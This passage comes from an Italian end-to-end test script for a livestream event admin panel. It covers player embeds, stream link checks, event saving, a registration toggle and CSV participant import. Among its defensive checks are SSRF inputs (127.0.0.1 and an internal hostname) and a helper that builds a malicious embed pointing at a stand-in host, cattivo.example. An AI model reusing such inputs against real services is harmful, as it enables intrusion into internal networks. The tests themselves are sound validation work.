        p = await provaLink('ev-azoto', AZOTO_LENTO);
        vero(p.esito === 'avviso' && p.bollo === 'Da controllare' && p.titolo === 'Player Azoto: non risponde' && /Il server del player Azoto non risponde entro 8 secondi/.test(p.testo)
            && /Anteprima: il player per ora non si vede, per il problema segnalato qui sotto/.test(p.testo) && azoto.richieste.includes('/cloudtv/lento/player/')
            && !(await $('#ev-azoto-anteprima').isVisible()),
            'il player che non risponde: «Da controllare» — «' + p.titolo + '» (il servizio aspetta 8 secondi, l\'anteprima 15, poi si chiude: ' + Math.round((Date.now() - inizioLento) / 1000) + ' s)', p.testo);

        console.log('\n-- «Prova il player» con il codice vero di Azoto');
        const richiesteAzotoPrima = azoto.richieste.length;
        p = await provaLink('ev-azoto', CODICE_AZOTO);
        vero(p.chiamate === 1 && p.richiesta.dati.link === AZOTO_29 && !/[<>]/.test(p.richiesta.grezzo) && p.servizio && p.servizio.tipo === 'incorporato' && p.servizio.valore === AZOTO_29,
            'al servizio va solo l\'indirizzo (prova-link { link: "' + AZOTO_29 + '" }), mai il codice incollato', p.richiesta && p.richiesta.grezzo);
        vero(p.esito === 'ok' && p.bollo === 'Si può usare' && p.titolo === 'Player Azoto: si può incorporare nella nostra pagina' && p.servizio.info.incorporabile === true
            && /Anteprima: il player Azoto compare qui sotto, con i suoi comandi/.test(p.testo) && !p.testo.includes(V.AVVISO_INCORPORATO),
            'il player di Azoto: «Si può usare» — «' + p.titolo + '», con l\'anteprima (la nota sui comandi di Azoto resta sotto il campo e non si ripete)', p.testo);
        vero(p.tipo === 'Prova finita: il player si può usare. Indirizzo del player: ' + AZOTO_29, 'sotto il campo resta l\'indirizzo che si salva: «' + p.tipo + '»');
        const ifr = await anteprimaAzoto('#ev-azoto-anteprima');
        vero(ifr.length === 1 && ifr[0].classe === 'player-azoto' && ifr[0].src === AZOTO_29 && ifr[0].allow === 'autoplay; fullscreen; picture-in-picture; encrypted-media'
            && ifr[0].schermoIntero && ifr[0].referrer === 'strict-origin-when-cross-origin' && ifr[0].scrolling === 'no'
            && ifr[0].titolo === 'Diretta: Next Generation Business 2026 · Napoli' && ifr[0].estranei.length === 0,
            'l\'anteprima è player-azoto.js: iframe.player-azoto con allow="autoplay; fullscreen; picture-in-picture; encrypted-media", allowfullscreen, referrerpolicy strict-origin-when-cross-origin, scrolling no e title «Diretta: <titolo>»', JSON.stringify(ifr));
        const fAzoto = await paginaAzotoIn('#ev-azoto-anteprima', 'livetv91');
        vero(!!fAzoto && azoto.richieste.slice(richiesteAzotoPrima).join(' ') === '/cloudtv/livetv91/player /cloudtv/livetv91/player/',
            'nell\'iframe c\'è la pagina (finta) del player di Azoto: l\'indirizzo salvato, poi il suo /player/ (301, come quello vero)', azoto.richieste.slice(richiesteAzotoPrima).join(' '));
        if (fAzoto) await fAzoto.locator('#play-azoto').click({ timeout: 5000 }).catch(() => {});
        vero(!!ifr[0] && ifr[0].libero && ifr[0].largo >= 300 && ifr[0].alto >= 150 && !!fAzoto && await fAzoto.locator('body').getAttribute('data-premuto') === 'si',
            'i comandi di Azoto rispondono: il suo tasto play si preme dentro l\'anteprima, e sopra l\'iframe non c\'è niente di nostro (' + (ifr[0] && ifr[0].largo) + 'x' + (ifr[0] && ifr[0].alto) + ')');
        await fotoVideo('01-evento-tipo-player', '#ev-tipo-player', '#ev-azoto-indirizzo');

        console.log('\n-- «Prova il link» del flusso diretto');
        const richiesteWebTvPrima = webtv.richieste.length;
        const richiestePrivate = [];
        page.on('request', q => { if (/^https:\/\/(127\.0\.0\.1|interno\.prova\.test)\//.test(q.url())) richiestePrivate.push(q.url()); });
        p = await provaLink('ev-video', LINK.ipPrivato);
        vero(p.esito === 'errore' && p.titolo === 'Indirizzo non pubblico: non si può usare' && /indirizzo interno o privato \(127\.0\.0\.1\)/.test(p.testo),
            'https://127.0.0.1/…: il servizio rifiuta l\'indirizzo privato senza scaricarlo (SSRF) — «' + p.titolo + '»', p.testo);
        p = await provaLink('ev-video', LINK.nomeInterno);
        vero(p.esito === 'errore' && p.titolo === 'Indirizzo non pubblico: non si può usare' && /interno\.prova\.test/.test(p.testo),
            'un nome che il DNS porta nella rete interna (interno.prova.test -> 10.20.30.40): rifiutato anche lui');
        vero(richiestePrivate.length === 0 && webtv.richieste.length === richiesteWebTvPrima, 'per gli indirizzi privati nemmeno il browser prova a collegarsi (niente anteprima)', richiestePrivate.join(' '));

        // il server della web TV non consente la lettura dal nostro sito (CORS)
        p = await provaLink('ev-video', LINK.senzaCors);
        const testoCors = await testo('#ev-video-esito .testo-webtv-corpo');
        vero(p.esito === 'avviso' && p.bollo === 'Da controllare' && /non consente la riproduzione dal nostro sito/.test(p.testo)
            && /Confermato dal browser: la lettura dal nostro sito è bloccata \(CORS\)/.test(p.testo),
            'CORS mancante: «Da controllare», lo dice il servizio e lo conferma il browser (lettura dal nostro dominio bloccata)', p.testo);
        vero(/^Buongiorno,/.test(testoCors) && testoCors.includes(LINK.senzaCors) && testoCors.includes('Access-Control-Allow-Origin: ' + SITO_PUBBLICO) && /Grazie e buona giornata\.$/.test(testoCors),
            'il testo pronto da girare alla web TV: il link, l\'intestazione da abilitare e il nostro dominio', testoCors);
        await $('#ev-video-esito .testo-webtv button').first().click();
        await aspetta(async () => /Testo (copiato|selezionato)/.test(await testo('#ev-video-esito .testo-webtv-esito')), 5000, 'copia del testo');
        const appunti = await page.evaluate(() => navigator.clipboard.readText().catch(() => ''));
        vero(await testo('#ev-video-esito .testo-webtv button') === 'Copia il testo per la web TV' && /Testo copiato/.test(await testo('#ev-video-esito .testo-webtv-esito')) && appunti === testoCors,
            '«Copia il testo per la web TV»: il testo è negli appunti, pronto da incollare nell\'email — «' + await testo('#ev-video-esito .testo-webtv-esito') + '»');

        // il flusso che funziona
        p = await provaLink('ev-video', LINK.live);
        vero(p.esito === 'ok' && p.bollo === 'Si può usare' && p.titolo === 'Flusso HLS in diretta, 2 qualità (360p, 180p), non si può tornare indietro'
            && p.servizio.info.diretta === true && p.servizio.info.corsOk === true && p.servizio.info.qualita.length === 2,
            'il flusso che funziona: «Si può usare» — «' + p.titolo + '»', JSON.stringify(p.servizio && p.servizio.info));
        vero(/Qualità: 360p \(1,0 Mbit\/s\), 180p \(0,3 Mbit\/s\)/.test(p.testo) && /Segmenti da 2 secondi/.test(p.testo)
            && /Dal browser il link si legge/.test(p.testo) && /Anteprima: il video si vede qui sotto con il player dei partecipanti/.test(p.testo),
            'nel risultato: le qualità, i segmenti, la lettura dal browser (CORS ok) e l\'anteprima', p.testo);
        vero(await $('#ev-video-anteprima video').count() === 1 && await videoVa('#ev-video-anteprima'), 'l\'anteprima sotto il campo è il player vero dei partecipanti (modalità B), e il video va (il tempo avanza)');
        vero(!(await radioFlusso.isDisabled()) && await radioAzoto.isChecked(), 'con il flusso provato «Flusso diretto (.m3u8)» si può scegliere, ma resta scelto il player Azoto');
        await fotoVideo('02-evento-flusso-provato', '#blocco-flusso', '#ev-video-esito .esito-righe');
        vero(chiamate('evento-salva').length === 0, 'fin qui nessun salvataggio: le prove non salvano niente');

        await $('#ev-ora-inizio').fill('17:30');
        await $('#ev-ora-fine').fill('09:00');
        await $('#btn-salva-evento').click();
        vero(await $('#ev-ora-fine').getAttribute('aria-invalid') === 'true' && /dopo quella di inizio/.test(await testo('#msg-evento')), 'fine prima dell\'inizio: errore sul campo, niente chiamata al servizio');
        vero(chiamate('evento-salva').length === 0, 'nessun salvataggio con dati sbagliati');
        await $('#ev-ora-inizio').fill('09:00');
        await $('#ev-ora-fine').fill('17:30');
        // la riserva e' un flusso che non risponde ancora (404): si salva solo dopo averlo confermato
        await scriviLink('ev-riserva', LINK.spento);
        const proveAlSalvataggio = chiamate('prova-link').length;
        await $('#btn-salva-evento').click();
        const domandaSpento = await confermaDialogo(/Salvare lo stesso\?.*Link di riserva: .*il flusso non c'è \(errore 404\)/s, 'Salva lo stesso');
        vero(/i partecipanti potrebbero non vedere il video/.test(domandaSpento), 'flusso che non risponde (404, la diretta non è ancora partita): «Salvare lo stesso?» con il motivo, e si salva solo con «Salva lo stesso»');
        await aspetta(async () => /Evento creato/.test(await testo('#msg-evento')), 10000, 'evento creato');
        vero(chiamate('prova-link').length === proveAlSalvataggio + 1, 'al salvataggio si prova solo la riserva: le prove del player Azoto e del flusso di poco fa (stesso testo) valgono ancora');
        vero(/Dal codice di Azoto ho salvato solo l'indirizzo del player\./.test(await testo('#msg-evento')) && /Ricorda i problemi segnalati dalla prova/.test(await testo('#msg-evento')),
            'dopo il salvataggio lo dice: «' + await testo('#msg-evento') + '»');
        const salvataggio = chiamate('evento-salva')[0];
        const salvato = salvataggio.dati.evento;
        vero(salvato.nuovo === true && salvato.id === ID && salvato.paginaEvento === '/napoli_ottobre_2026/' && salvato.tipoPlayer === 'azoto' && salvato.azotoUrl === AZOTO_29
            && salvato.videoUrl === LINK.live && salvato.videoId === LINK.live && salvato.riservaUrl === LINK.spento && !('firma' in salvato),
            'evento-salva riceve id, pagina normalizzata, tipoPlayer «azoto», SOLO l\'indirizzo del player (azotoUrl), il flusso (videoUrl, videoId) e la riserva (riservaUrl)', JSON.stringify(salvato));
        vero(!/[<>]|azoto-player|frameborder|script/i.test(salvataggio.grezzo), 'nella richiesta non c\'è niente del codice incollato (niente tag, script, frameborder)', salvataggio.grezzo.slice(0, 400));
        vero(salvato.programma.length === 5 && salvato.programma[2].ora === '10.00' && salvato.programma[2].titolo === 'Adeguati assetti e governance',
            'programma letto riga per riga ("10:00 - Titolo" diventa {ora: "10.00", titolo})', JSON.stringify(salvato.programma));
        const [docEv, docRis] = await Promise.all([db.doc('eventi/' + ID).get(), db.doc('eventiRiservati/' + ID).get()]);
        const ris = docRis.data();
        vero(ris.tipoPlayer === 'azoto' && ris.azotoUrl === AZOTO_29 && ris.videoUrl === LINK.live && ris.videoId === LINK.live && ris.riservaUrl === LINK.spento && ris.riservaId === LINK.spento
            && ris.firma && ris.firma.schema === 'nessuna' && !/[<>]/.test(JSON.stringify(ris)),
            'nel documento riservato (letto qui con firebase-admin): tipoPlayer «azoto», azotoUrl = solo l\'indirizzo ' + AZOTO_29 + ', il flusso e la riserva; nessun HTML', JSON.stringify(ris));
        const pubNuovo = docEv.data() || {};
        vero(docEv.exists && pubNuovo.tipoPlayer === 'azoto' && pubNuovo.videoId === '' && pubNuovo.videoRiserva === '' && pubNuovo.sorgente === 'principale' && pubNuovo.videoFirmato === false
            && !/azotosolutions|prova\.test|[<>]/.test(JSON.stringify(pubNuovo)) && pubNuovo.inizio.toMillis() === Date.parse('2026-10-02T09:00:00+02:00') && pubNuovo.programma.length === 5,
            'nel documento pubblico eventi/' + ID + ' il tipo di player («azoto») e nessun indirizzo finché non si va in onda (videoId e videoRiserva vuoti), inizio alle 9.00 di Roma', JSON.stringify(pubNuovo).slice(0, 300));
        vero(await $('#sel-evento').inputValue() === ID && await testo('#stato-testata') === 'In attesa', 'evento selezionato, stato «In attesa» in testata');
        vero(await $('#ev-id').evaluate(n => n.readOnly), 'dopo la creazione l\'identificativo non si cambia più');
        vero(await $('#ev-azoto').inputValue() === AZOTO_29 && await testo('#ev-azoto-indirizzo') === 'Player salvato: ' + AZOTO_29
            && await $('#ev-video').inputValue() === LINK.live && await $('#ev-riserva').inputValue() === LINK.spento && /Link salvato\./.test(await testo('#ev-video-tipo')),
            'il modulo mostra quello che è salvato: al posto del codice incollato l\'indirizzo del player («Player salvato: …»), e i due link del flusso («Link salvato.»)');
        vero(await radioAzoto.isChecked() && !(await radioFlusso.isDisabled()) && await testo('#blocco-azoto .blocco-uso') === 'in uso' && await testo('#blocco-flusso .blocco-uso') === 'non in uso',
            'salvato: «Player Azoto» in uso; «Flusso diretto (.m3u8)» ora si può scegliere (il link c\'è)');

        console.log('\n-- il servizio chiamato a mano: le stesse regole');
        const rifiutiServizio = [];
        for (const [valore, codice] of rifiutatiAzoto) {
            const s = await api('diretta-gestione', { azione: 'evento-salva', evento: { id: ID, azotoUrl: valore } }, tokGestore);
            if (!(s.stato === 400 && s.dati.codice === 'azoto' && s.dati.msg === MSG(codice))) rifiutiServizio.push(valore + ' -> ' + s.stato + ' ' + JSON.stringify(s.dati));
        }
        const sDaRegia = await api('diretta-gestione', { azione: 'evento-video', idEvento: ID, azotoUrl: codiceMalevolo('https://cattivo.example/player') }, tokGestore);
        vero(rifiutiServizio.length === 0 && sDaRegia.stato === 400 && sDaRegia.dati.codice === 'azoto' && sDaRegia.dati.msg === MSG('non-azoto'),
            'anche chiamando il servizio a mano (evento-salva ed evento-video) gli stessi ' + rifiutatiAzoto.length + ' indirizzi non consentiti si rifiutano: 400, campo «azoto», con lo stesso messaggio della gestione', rifiutiServizio.join('\n'));
        const sFlussoAzoto = await api('diretta-gestione', { azione: 'evento-salva', evento: { id: ID, videoUrl: AZOTO_29 } }, tokGestore);
        const sTipo = await api('diretta-gestione', { azione: 'evento-player', idEvento: ID, tipoPlayer: 'iframe' }, tokGestore);
        const sPrivato = await api('diretta-gestione', { azione: 'evento-video', idEvento: ID, videoUrl: LINK.ipPrivato }, tokGestore);
        vero(sFlussoAzoto.stato === 400 && sFlussoAzoto.dati.codice === 'video' && sFlussoAzoto.dati.msg === MSG('e-azoto') && sTipo.stato === 400 && sTipo.dati.codice === 'tipoPlayer'
            && sPrivato.stato === 400 && /indirizzo interno o privato/.test(sPrivato.dati.msg),
            'e anche: il player di Azoto al posto del flusso (400 «' + sFlussoAzoto.dati.msg + '»), un tipo di player che non esiste (400 tipoPlayer), un indirizzo privato (400 «' + sPrivato.dati.msg + '»)');
        const sFirmato = await api('diretta-gestione', { azione: 'link-firmato', idEvento: ID }, tokGestore);
        vero(sFirmato.stato === 409 && sFirmato.dati.codice === 'non-flusso', 'con il player Azoto in uso il servizio non dà link del flusso (link-firmato: 409 non-flusso)', JSON.stringify(sFirmato));
        const risDopoRifiuti = (await db.doc('eventiRiservati/' + ID).get()).data();
        vero(risDopoRifiuti.azotoUrl === AZOTO_29 && risDopoRifiuti.videoId === LINK.live && risDopoRifiuti.tipoPlayer === 'azoto',
            'e nel documento riservato non è cambiato niente (azotoUrl ' + risDopoRifiuti.azotoUrl + ')');
        await foto('evento');

        /* ---------- 2b. l'interruttore delle iscrizioni dal modulo del sito ----------
           «Invia subito la password a chi si iscrive dal modulo del sito»:
           spento di base, vale subito (evento-iscrizioni), acceso vuole la
           pagina dell'evento (400 'pagina') e una pagina lo puo' avere acceso
           su un evento solo (409 'iscrizioni-doppie'). */
        console.log('\n-- «Invia subito la password a chi si iscrive dal modulo del sito»');
        const interruttore = $('#ev-iscrizioni-auto');
        const leva = $('label.interruttore');
        const accesoSulServizio = async id => ((await db.doc('eventiRiservati/' + (id || ID)).get()).data() || {}).iscrizioniAutomatiche;
        const chiamateInterruttore = () => chiamate('evento-iscrizioni').length;
        // «Salva le modifiche» del modulo dell'evento: si aspetta la risposta vera del servizio
        const salvaModulo = async () => {
            const n = chiamate('evento-salva').length;
            await $('#btn-salva-evento').click();
            await aspetta(async () => chiamate('evento-salva').length > n && await $('#btn-salva-evento').getAttribute('aria-busy') !== 'true', 15000, 'salvataggio dell\'evento');
            return testo('#msg-evento');
        };
        vero(await interruttore.getAttribute('role') === 'switch' && (await leva.textContent()).trim() === 'Invia subito la password a chi si iscrive dal modulo del sito'
            && !(await interruttore.isChecked()) && !(await interruttore.isDisabled()) && await accesoSulServizio() === false,
            'l\'interruttore «Invia subito la password a chi si iscrive dal modulo del sito» c\'è (role="switch") ed è SPENTO di base, anche sul servizio (eventiRiservati.iscrizioniAutomatiche false)');
        const aiutoIscrizioni = (await testo('#iscrizioni-aiuto')).replace(/\s+/g, ' ');
        vero(/Vale per chi si iscrive online dal modulo della «Pagina dell'evento sul sito»/.test(aiutoIscrizioni) && /Sei iscritto anche a…/.test(aiutoIscrizioni)
            && /accendilo dopo aver caricato e inviato la prima lista/.test(aiutoIscrizioni) && /^Spento:/.test(await testo('#iscrizioni-stato')),
            'la spiegazione: vale per le iscrizioni online dal modulo della pagina dell\'evento, chi ha già un account riceve «Sei iscritto anche a…», da accendere dopo la prima lista — «' + await testo('#iscrizioni-stato') + '»', aiutoIscrizioni);

        // 409: la stessa pagina ha gia' l'invio automatico acceso su un altro evento (Roma, preparato con il servizio)
        const romaSullaPagina = await api('diretta-gestione', { azione: 'evento-salva', evento: { id: 'roma-2026', paginaEvento: '/napoli_ottobre_2026/', iscrizioniAutomatiche: true } }, tokGestore);
        vero(romaSullaPagina.stato === 200 && romaSullaPagina.dati.evento.iscrizioniAutomatiche === true, 'preparato con il servizio: l\'evento di Roma con la stessa pagina e l\'invio automatico acceso', JSON.stringify(romaSullaPagina.dati).slice(0, 200));
        await leva.click();
        await confermaDialogo(/Mandare subito la password a chi si iscrive dal sito\?.*\/napoli_ottobre_2026\/.*Sei iscritto anche a….*seconda password.*prima lista/s, 'Accendi l\'invio automatico');
        await aspetta(async () => await visibile('#msg-iscrizioni') && await $('#ev-iscrizioni-auto').getAttribute('aria-busy') !== 'true', 10000, 'risposta 409');
        vero(/già acceso per un altro evento con la stessa pagina \(«Next Generation Business 2026 · Roma»\): spegnilo lì prima di accenderlo qui/.test(await testo('#msg-iscrizioni'))
            && /msg-errore/.test(await $('#msg-iscrizioni').getAttribute('class')) && !(await interruttore.isChecked()) && await accesoSulServizio() === false
            && chiamate('evento-iscrizioni').pop().dati.iscrizioniAutomatiche === true,
            'la stessa pagina ha già l\'invio acceso su Roma: il servizio risponde 409 «iscrizioni-doppie» e la gestione mostra il suo testo, con l\'interruttore di nuovo spento — «' + await testo('#msg-iscrizioni') + '»');
        const romaDiNuovo = await api('diretta-gestione', { azione: 'evento-iscrizioni', idEvento: 'roma-2026', iscrizioniAutomatiche: false }, tokGestore);
        const romaPagina = await api('diretta-gestione', { azione: 'evento-salva', evento: { id: 'roma-2026', paginaEvento: '/roma_aprile_2026/' } }, tokGestore);
        vero(romaDiNuovo.stato === 200 && romaDiNuovo.dati.evento.iscrizioniAutomatiche === false && romaPagina.stato === 200 && await accesoSulServizio('roma-2026') === false,
            'a Roma l\'invio automatico si spegne (evento-iscrizioni false) e la pagina torna la sua');

        // 400: senza la pagina dell'evento
        await $('#ev-pagina').fill('');
        vero(/Modifiche salvate/.test(await salvaModulo()), 'tolta la pagina dell\'evento (salvato: l\'invio automatico è spento)');
        await leva.click();
        await confermaDialogo(/Mandare subito la password/);
        await aspetta(async () => await visibile('#msg-iscrizioni') && /Pagina dell'evento/.test(await testo('#msg-iscrizioni')), 10000, 'risposta 400');
        vero(/serve la «Pagina dell'evento» \(per esempio \/napoli_ottobre_2026\/\)\. Scrivila qui sopra, salva l'evento e poi riaccendi l'invio automatico\./.test(await testo('#msg-iscrizioni'))
            && await $('#ev-pagina').getAttribute('aria-invalid') === 'true' && !(await interruttore.isChecked()) && await accesoSulServizio() === false,
            'senza la pagina dell\'evento: 400 «pagina» dal servizio, il campo della pagina segnato e l\'interruttore spento — «' + await testo('#msg-iscrizioni') + '»');
        // una pagina scritta ma non salvata non vale: la pagina lo dice senza chiamare il servizio
        await $('#ev-pagina').fill('napoli_ottobre_2026');
        const primaDellaLeva = chiamateInterruttore();
        await leva.click();
        await aspetta(async () => /salva prima le modifiche/.test(await testo('#msg-iscrizioni')), 5000, 'pagina non salvata');
        vero(chiamateInterruttore() === primaDellaLeva && !(await interruttore.isChecked()) && !(await $('#dialogo-conferma').isVisible()),
            'con la pagina scritta ma non ancora salvata: «' + await testo('#msg-iscrizioni') + '» (nessuna chiamata)');
        await salvaModulo();
        vero((await db.doc('eventi/' + ID).get()).data().paginaEvento === '/napoli_ottobre_2026/', 'pagina dell\'evento di nuovo /napoli_ottobre_2026/');

        // acceso
        await leva.click();
        await confermaDialogo(/Mandare subito la password/, 'Accendi l\'invio automatico');
        await aspetta(async () => await interruttore.isChecked() && /Invio automatico acceso/.test(await testo('#msg-iscrizioni')), 10000, 'acceso');
        const pubblicoConInterruttore = (await db.doc('eventi/' + ID).get()).data();
        const riservatiAcceso = (await db.doc('eventiRiservati/' + ID).get()).data() || {};
        vero(await accesoSulServizio() === true && !('iscrizioniAutomatiche' in pubblicoConInterruttore) && !('iscrizioniAutomaticheDa' in pubblicoConInterruttore)
            && riservatiAcceso.iscrizioniAutomaticheDa && Date.now() - riservatiAcceso.iscrizioniAutomaticheDa.toMillis() < 60000
            && /^Acceso: chi si iscrive online dal modulo di \/napoli_ottobre_2026\/ riceve subito la password\. Vale per chi si è iscritto dal \d{2}\/\d{2}\/\d{4} \d{2}:\d{2}\.$/.test(await testo('#iscrizioni-stato')),
            'acceso: eventiRiservati.iscrizioniAutomatiche true e il momento dell\'accensione (non nel documento pubblico, che i partecipanti leggono); accanto all\'interruttore da quando è acceso — «' + await testo('#iscrizioni-stato') + '»');
        await foto('evento-iscrizioni');
        // acceso, la pagina non si puo' togliere: evento-salva risponde 400 'pagina'
        await $('#ev-pagina').fill('');
        await salvaModulo();
        vero(/serve la «Pagina dell'evento».*L'invio automatico della password è acceso: spegnilo qui sotto se vuoi togliere la pagina/.test(await testo('#msg-evento'))
            && await $('#ev-pagina').getAttribute('aria-invalid') === 'true' && (await db.doc('eventi/' + ID).get()).data().paginaEvento === '/napoli_ottobre_2026/',
            'con l\'invio acceso la pagina non si toglie: 400 «pagina» da evento-salva, niente salvato — «' + await testo('#msg-evento') + '»');
        await $('#ev-pagina').fill('/napoli_ottobre_2026/');
        // spento (senza domande: spegnere non manda niente a nessuno)
        await leva.click();
        await aspetta(async () => !(await interruttore.isChecked()) && /Invio automatico spento/.test(await testo('#msg-iscrizioni')), 10000, 'spento');
        vero(await accesoSulServizio() === false && !(await $('#dialogo-conferma').isVisible()), 'spento di nuovo, senza domande: «' + await testo('#msg-iscrizioni') + '»');
        vero(/Modifiche salvate/.test(await salvaModulo()), 'la pagina dell\'evento di nuovo com\'era, salvata');

        /* ---------- 3. caricamento e anteprima, per EMAIL ---------- */
        console.log('\n-- caricamento di esempio-partecipanti.csv');
        await page.click('[data-scheda="partecipanti"]');
        const [modello] = await Promise.all([page.waitForEvent('download', { timeout: 10000 }), $('#link-modello').click()]);
        const testoModello = fs.readFileSync(await modello.path(), 'utf8');
        vero(modello.suggestedFilename() === 'modello-partecipanti.csv' && /^﻿nome;cognome;email;azienda\r\n/.test(testoModello), '«Scarica il modello CSV»: nome;cognome;email;azienda, con il BOM per Excel');
        const postaPrimaDelFile = leggiPosta().length;
        await $('#file-partecipanti').setInputFiles(path.join(__dirname, 'esempio-partecipanti.csv'));
        await $('#anteprima-caricamento').waitFor({ state: 'visible', timeout: 20000 });
        await aspetta(async () => (await $('#tabella-anteprima tbody tr').count()) === 42 && /righe lette/.test(await testo('#riepilogo-anteprima')), 15000, 'anteprima con 42 righe');
        vero(true, 'anteprima: 42 righe (la riga vuota del file è saltata)');
        const primaAnteprima = chiamate('anteprima')[0].dati;
        vero(chiamate('anteprima').length === 1 && primaAnteprima.idEvento === ID && primaAnteprima.righe.length === 42
            && primaAnteprima.righe.every(r => JSON.stringify(Object.keys(r).sort()) === JSON.stringify(['azienda', 'cognome', 'email', 'escludi', 'nome', 'riga']) && r.escludi === false),
            'l\'anteprima la fa il servizio: UNA chiamata con le 42 righe del file (riga, nome, cognome, email, azienda, escludi), nessun nome utente', JSON.stringify(primaAnteprima.righe[0]));
        const esitiAttesi = {
            2: 'nuovo', 3: 'nuovo', 4: 'nuovo', 5: 'gia-presente', 6: 'email-mancante', 7: 'email-non-valida', 8: 'nome-mancante', 9: 'nome-mancante',
            10: 'doppia-nel-file', 11: 'nuovo', 12: 'email-condivisa', 13: 'nuovo', 15: 'nuovo', 25: 'nuovo', 31: 'doppia-nel-file', 32: 'nuovo', 33: 'nuovo',
            34: 'doppia-nel-file', 35: 'email-condivisa', 36: 'email-condivisa', 44: 'nuovo'
        };
        const GRAVI = ['email-mancante', 'email-non-valida', 'nome-mancante', 'nome-non-valido', 'email-condivisa'];
        const esitiSbagliati = [];
        for (const n of Object.keys(esitiAttesi)) {
            const cl = (await classeRiga(n)).split(/\s+/);
            if (!cl.includes('esito-' + esitiAttesi[n]) || cl.includes('da-correggere') !== GRAVI.includes(esitiAttesi[n])) esitiSbagliati.push(n + ': ' + cl.join(' '));
        }
        vero(!esitiSbagliati.length, 'esiti del servizio riga per riga, con i colori: ' + Object.keys(esitiAttesi).map(n => n + ' ' + esitiAttesi[n]).join(', '), esitiSbagliati.join('\n'));
        const problemiDi = async n => (await riga(n).locator('.problemi').textContent()) || '';
        const etichettaDi = async n => (await riga(n).locator('.etichette-esito').textContent()) || '';
        vero(await etichettaDi(5) === 'Già registrata' && /Account già esistente: nessun nuovo account e nessuna password nuova/.test(await problemiDi(5)),
            'riga 5, Giulia Ferri con « Giulia.Ferri@Ferri-Consulting.EXAMPLE » (maiuscole e spazi): è l\'email del suo account di Roma — «Già registrata», nessun account nuovo, nessuna password nuova');
        vero(await etichettaDi(10) === 'Doppia nel file' && /Stessa persona e stessa email della riga 2/.test(await problemiDi(10))
            && /Stessa persona e stessa email della riga 3/.test(await problemiDi(31)) && /Stessa persona e stessa email della riga 33/.test(await problemiDi(34)),
            'la stessa email scritta in modi diversi è la stessa: MARIO.ROSSI@ROSSI-SRL.EXAMPLE (riga 10), «Annamaria Deluca» con AnnaMaria.DeLuca@Deluca-Figli.EXAMPLE (riga 31), LUCIA.FERRARO@… con uno spazio (riga 34): «Doppia nel file», non va corretta');
        vero(/La stessa email è anche alla riga 36 \(Marco Galli\): ogni persona deve avere il suo indirizzo/.test(await problemiDi(35)) && /anche alla riga 35 \(Federica Galli\)/.test(await problemiDi(36))
            && await etichettaDi(35) === 'Email condivisa',
            'la stessa email per due persone diverse (info@studiogalli.example): «Email condivisa» su tutte e due le righe, da correggere');
        vero(/Con questa email è già registrato Mario Rossi: se è la stessa persona scrivi il nome come è registrato/.test(await problemiDi(12)),
            'riga 12, Marta Rossi con l\'email dell\'account di Mario Rossi (Roma): «Email condivisa», da correggere (un account è di una persona sola)');
        vero((await classeRiga(2)).includes('esito-nuovo') && (await classeRiga(11)).includes('esito-nuovo') && !(await problemiDi(2)) && !(await problemiDi(11))
            && (await classeRiga(13)).includes('esito-nuovo') && (await classeRiga(32)).includes('esito-nuovo'),
            'due Mario Rossi con email diverse sono due persone (nessun problema, niente numeri); i nomi in cirillico e in cinese vanno bene così');
        vero(await riga(6).locator('input.campo-email').getAttribute('aria-invalid') === 'true' && await riga(8).locator('input.campo-nome').getAttribute('aria-invalid') === 'true'
            && await riga(8).locator('input.campo-cognome').getAttribute('aria-invalid') === null && await riga(9).locator('input.campo-cognome').getAttribute('aria-invalid') === 'true'
            && await riga(35).locator('input.campo-email').getAttribute('aria-invalid') === 'true',
            'i campi da correggere sono segnati (l\'email mancante, il nome o il cognome vuoto, l\'email condivisa)');
        const riepilogoFile = await testo('#riepilogo-anteprima');
        vero(/42\s*righe lette/.test(riepilogoFile) && /31\s*nuovi account/.test(riepilogoFile) && /1\s*già registrata, da aggiungere/.test(riepilogoFile)
            && /3\s*doppie nel file/.test(riepilogoFile) && /7\s*da correggere/.test(riepilogoFile), 'riepilogo: ' + riepilogoFile);
        vero(await $('#btn-crea-account').isDisabled()
            && await testo('#motivo-blocco') === 'Per creare gli account correggi o escludi 7 righe: 1 email mancante, 1 email non valida, 2 senza nome o cognome, 3 email condivise da persone diverse.',
            '«Crea gli account» spento finché c\'è da correggere, e il perché: «' + await testo('#motivo-blocco') + '»');
        const visibili = () => page.evaluate(() => Array.from(document.querySelectorAll('#tabella-anteprima tbody tr')).filter(t => !t.hidden).length);
        vero(await $('input[name="filtro-anteprima"][value="problemi"]').isChecked() && await visibili() === 11, 'con dei problemi si parte dal filtro «Solo da controllare» (11 righe)', await visibili());
        await foto('anteprima');
        await page.click('input[name="filtro-anteprima"][value="da-sistemare"] >> xpath=..');
        vero(await visibili() === 7, 'filtro «Solo da sistemare»: le 7 righe da correggere', await visibili());
        await page.click('input[name="filtro-anteprima"][value="tutte"] >> xpath=..');
        vero(await visibili() === 42, 'filtro «Tutte»: 42 righe');
        vero(leggiPosta().length === postaPrimaDelFile, 'l\'anteprima non manda niente a nessuno');

        console.log('\n-- correzioni in linea');
        const nAnteprima = chiamate('anteprima').length;
        await riga(7).locator('input.campo-email').fill('francesca.esposito@esposito.example');
        await aspetta(async () => (await classeRiga(7)).includes('esito-nuovo'), 8000, 'riga 7 corretta');
        const dopoRiga7 = chiamate('anteprima').slice(nAnteprima);
        vero(dopoRiga7.length === 1 && dopoRiga7[0].dati.righe.length === 42 && dopoRiga7[0].dati.righe.find(r => r.riga === 7).email === 'francesca.esposito@esposito.example',
            'riga 7: email corretta, ora «Nuovo account»; al servizio è andata UNA anteprima con tutto il file corretto (dopo una breve pausa, non a ogni tasto)');
        await riga(6).locator('input.campo-email').fill('luca.bianchi@bianchi-impianti.example');
        await riga(9).locator('input.campo-cognome').fill('Verdi');
        await riga(8).locator('input.escludi-riga').check();
        await riga(12).locator('input.campo-email').fill('marta.rossi@altra-azienda.example');
        await riga(36).locator('input.campo-email').fill('marco.galli@studiogalli.example');
        await aspetta(async () => (await classeRiga(8)).includes('esito-escluso') && (await classeRiga(6)).includes('esito-nuovo') && (await classeRiga(9)).includes('esito-nuovo')
            && (await classeRiga(12)).includes('esito-nuovo') && (await classeRiga(35)).includes('esito-nuovo') && (await classeRiga(36)).includes('esito-nuovo'), 8000, 'correzioni');
        vero(!(await problemiDi(35)), 'righe 6, 9 e 12 corrette, riga 8 esclusa; data a Marco Galli la sua email, anche la riga 35 di Federica è a posto (l\'email condivisa era una sola)');
        vero(chiamate('anteprima').pop().dati.righe.find(r => r.riga === 8).escludi === true, 'l\'esclusione va al servizio (escludi: true) e la riga diventa «Esclusa»');
